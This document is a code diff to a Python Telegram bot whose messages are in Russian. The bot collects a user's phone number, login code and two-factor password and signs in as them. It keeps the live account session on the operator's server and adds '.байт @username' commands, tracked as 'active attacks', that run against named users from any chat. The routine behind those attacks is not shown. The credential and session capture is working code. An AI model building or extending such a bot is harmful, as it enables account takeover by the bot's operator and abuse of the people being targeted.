@@ -39,9 +39,10 @@ bot_client = TelegramClient(
 ).start(bot_token=BOT_TOKEN)
 
 # ========== ХРАНИЛИЩА ==========
-user_clients = {}
-user_auth_data = {}
-active_attacks = {}
+# Здесь хранятся авторизованные пользователи (их сессии)
+user_clients = {}      # user_id -> TelegramClient (ЕГО аккаунт)
+user_auth_data = {}    # user_id -> временные данные для авторизации
+active_attacks = {}    # активные атаки
 
 # ========== КЛАВИАТУРЫ ==========
 def get_digit_keyboard():
@@ -283,13 +284,13 @@ async def handle(event):
     # /start только в личке с ботом
     if text == '/start' and chat_id == user_id:
         if user_id in user_clients:
-            await event.reply("✅ Ты уже авторизован\n\n.байт @username")
+            await event.reply("✅ Твой аккаунт уже авторизован!\n\n.байт @username\n.байтстоп @username")
             return
         buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
-        await event.reply("🔐 Нажми кнопку", buttons=buttons)
+        await event.reply("🔐 Нажми кнопку, чтобы авторизовать ТВОЙ аккаунт", buttons=buttons)
         return
 
-    # Получение номера (только в личке)
+    # Получение номера (только в личке с ботом)
     if event.contact and chat_id == user_id:
         phone = event.contact.phone_number
         if not phone:
@@ -299,24 +300,24 @@ async def handle(event):
             return
         
         session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
-        client = TelegramClient(session_path, API_ID, API_HASH)
-        await client.connect()
+        user_client = TelegramClient(session_path, API_ID, API_HASH)
+        await user_client.connect()
         try:
-            result = await client.send_code_request(phone)
+            result = await user_client.send_code_request(phone)
             user_auth_data[user_id] = {
-                'client': client,
+                'client': user_client,
                 'phone': phone,
                 'phone_code_hash': result.phone_code_hash,
                 'state': 'code_waiting',
                 'temp_input': ''
             }
-            await event.reply(f"✅ Код отправлен на {phone[-4:]}\n\nВведи код:", buttons=get_digit_keyboard())
+            await event.reply(f"✅ Код отправлен на {phone[-4:]}\n\nВведи код кнопками:", buttons=get_digit_keyboard())
         except Exception as e:
             await event.reply(f"❌ {e}")
         return
 
-    # Команды в любом чате (если авторизован)
-    if user_id not in user_auth_data and user_id in user_clients:
+    # Команды в ЛЮБОМ чате (если авторизован)
+    if user_id in user_clients:
         if text.startswith('.байт '):
             parts = text.split()
             if len(parts) < 2:
@@ -368,7 +369,7 @@ async def callback(event):
                 )
                 user_clients[user_id] = auth['client']
                 del user_auth_data[user_id]
-                await event.edit("✅ Авторизация успешна!\n\n.байт @username", buttons=get_clear_keyboard())
+                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
             except SessionPasswordNeededError:
                 auth['state'] = 'password_waiting'
                 auth['temp_input'] = ''
@@ -407,7 +408,7 @@ async def callback(event):
                 await auth['client'].sign_in(password=pwd)
                 user_clients[user_id] = auth['client']
                 del user_auth_data[user_id]
-                await event.edit("✅ Авторизация успешна!\n\n.байт @username", buttons=get_clear_keyboard())
+                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
             except Exception:
                 await event.answer("Неверный пароль", alert=True)
                 auth['temp_input'] = ''
@@ -426,6 +427,8 @@ async def main():
     await bot_client.start()
     me = await bot_client.get_me()
     print(f'✅ Бот: @{me.username}')
+    print('Пользователь авторизуется через /start')
+    print('После авторизации .байт @username в ЛЮБОМ чате')
     await bot_client.run_until_disconnected()
 
 with bot_client:
